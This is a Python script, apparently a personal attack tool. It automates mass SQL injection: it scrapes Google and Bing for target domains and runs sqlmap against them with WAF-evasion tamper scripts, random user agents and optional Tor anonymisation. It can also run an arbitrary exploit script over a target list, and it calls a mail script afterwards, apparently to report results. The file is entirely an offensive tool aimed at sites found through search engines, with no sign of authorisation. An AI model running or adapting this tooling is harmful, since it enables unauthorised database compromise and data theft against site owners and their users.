#works in py3,coz mysqlmap module need py3
#works in py2 with selenium not changed best,coz
#the mysqlmap module will use os.system function 
#to use the selenium changed version itself
#so here with py3 while selenium changed version or
#selenium not changed version is both ok.
#
#/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
import os
import re 
import mysqlmap
while(True):
	os.system('''mv -f ~/.sqlmap/output/* ~/.sqlmap/output_bak''')
	print('''do you want use 'tor' service in your sqli action? sometimes when your network is not very well,
is not a good idea to use tor,but when your targets has waf,use tor is better.
input Y(y) or N(n) default [Y]:>''',end='')
	choose=input()
	if choose=='N' or choose=='n':
		bool_tor=False
	else:
		bool_tor=True
	print('''there are several functions blew,chose the number of the list you want the script to do:
1.for exp execution to the targets,your targets file should include the urls like "http://xxx.xxx.xxx/xx/" or "https://xxx.xxx.xxx/ etc."
2.for sqli by mygoogle to search the domains in one ip
3.for sqli by mybing to search the domains in one ip
4.for sqli by google search<that is more than easy_search.py's function,but like "easy_search.py | sqlmap -m">
input your number here:>''',end='')
	num=int(input())
	if num==1:
		print("input your exp path here:>",end='')
		exp_path=input()
		print("input your targets path here:>",end='')
		targets=input()
		fp=open(targets,"r+")		
		list=fp.readlines()
		fp.close()
		for each in list:
			os.system('''python %s >> "out_log.txt"''' % exp_path)
		pass



	if num==2:
		print('''input your targets path here,the name has to be "targets.txt",
if your target file is not "targets.txt",you'd better change its file name to "targets.txt",
otherwise you need to change the source code :>''',end='')
		targets=input()
		print('''there are three kinds of sqli blew:
1.use "sqlmap_crawl" 
2.use "sqlmap-g-nohuman"
3.use "sqlmap-g-human
input your number here:''',end='')
		num=int(input())
		if num==1:
			os.system("/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f %s" % targets)
			mysqlmap.sqlmap_craw("GoogleScraper_bing_origin_http_domain_url_list.txt",bool_tor)
			try:
				mysqlmap.sqlmap_craw("bing_origin_http_domain_url_list.txt",bool_tor)
			except:
				pass
		if num==2:
			os.system("/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f %s" % targets)
			mysqlmap.sqlmap_g_nohuman("GoogleScraper_bing_http_domain_list.txt",bool_tor)
			try:
				mysqlmap.sqlmap_g_nohuman("bing_http_domain_list.txt",bool_tor)	
			except:
				pass
		if num==3:
			print('''!!!attention:all firefox process will be kill after easy_search''',end='')
			os.system("/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f %s" % targets)
			print("1111111111111111111success here")
			mysqlmap.sqlmap_g_human("GoogleScraper_bing_http_domain_list.txt",bool_tor)
			print("2222222222222222222success here")
			try:
				mysqlmap.sqlmap_g_human("bing_http_domain_list.txt",bool_tor)
			except:
				pass
		elif num!=1 and num!=2 and num!=3:
			print("choose number wrong")



	if num==3:
		print("input your targets path here:>",end='')
		targets=input()
		print('''there are three kinds of sqli blew:
1.use "sqlmap_crawl" 
2.use "sqlmap-g-nohuman"
3.use "sqlmap-g-human
input your number here:''',end='')
		num=int(input())
		if num==1:
			os.system("/usr/bin/python2.7 my_bing_domains_v1_alone.py %s" % targets)
			print('''os.system("/usr/bin/python2.7 my_bing_domains_v1_alone.py %s" % targets) execute.''')
			mysqlmap.sqlmap_craw("bing_origin_http_domain_url_list.txt",bool_tor)
		if num==2:
			os.system("/usr/bin/python2.7 my_bing_domains_v1_alone.py %s" % targets)
			print("/usr/bin/python2.7 my_bing_domains_v1_alone.py -f %s" % targets)
			print("8888888888888success here")
			mysqlmap.sqlmap_g_nohuman("bing_http_domain_list.txt",bool_tor)
		if num==3:
			os.system("/usr/bin/python2.7 my_bing_domains_v1_alone.py %s" % targets)
			mysqlmap.sqlmap_g_human("bing_http_domain_list.txt",bool_tor)
		elif num!=1 and num!=2 and num!=3:
			print("choose number wrong")

		pass
	if num==4:
		print('''input your keyword you want google to search>''',end='')
		keyword=input()
		print('''!!!attention:all firefox process will be kill after easy_search''',end='')		
		os.system('''/root/myenv/bin/python3.5 easy_search.py "%s"''' % keyword)
		#mysqlmap.sqlmap_g_human("GoogleScraper_origin_http_domain_url_list.txt",bool_tor)
		#above is a wrong action to use sqlmap_g_human,coz there exist easy_search.py's 
		#function in mysqlmap.sqlmap_g_human(),then use below to make it good to work:
		


		sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
		forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
		tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
		tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
		#print("sqlmap_string is:%s" % sqlmap_string)
		if bool_tor==False:
			print("sqlmap_string is:%s" % sqlmap_string)
			print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
			os.system("/usr/bin/python2.7 %s" % sqlmap_string)
			os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
		elif bool_tor==True:
			print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
			print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
			os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
			os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)



		pass
	os.system('/usr/bin/python2.7 mail.py')
	os.system('''mv -f ~/.sqlmap/output_bak/* ~/.sqlmap/output''')
